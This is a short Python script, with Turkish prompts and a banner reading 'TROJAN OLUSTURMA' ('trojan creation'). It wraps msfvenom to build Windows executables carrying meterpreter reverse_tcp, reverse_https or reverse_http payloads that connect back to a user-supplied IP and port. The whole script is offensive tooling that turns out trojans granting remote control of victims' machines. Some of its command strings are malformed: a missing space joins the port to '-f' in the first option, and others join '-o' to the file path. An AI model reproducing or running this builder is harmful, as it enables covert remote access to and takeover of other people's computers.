#!/usr/bin/env python




import os
os.system("apt-get install figlet")
os.system("clear")

os.system("figlet TROJAN OLUSTURMA")

print("""

Welcome

""")


ip=input("lokal veya dıs ip?")
port=input("port?")

print("""

1-windows/meterpreter/reverse_tcp

2-windows/meterpreter/reverse_https

3-windows/meterpreter/reverse_http



""")

payload=input("choose")
kayit=input("choose adress ")




if(payload=="1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" +ip + " LPORT=" + port + "-f exe -o " + kayit)
	
elif(payload=="2"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" +ip + " LPORT=" + port +" -f exe -o" + kayit)

elif(payload=="3"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" +ip + " LPORT=" +port + " -f exe -o" + kayit)









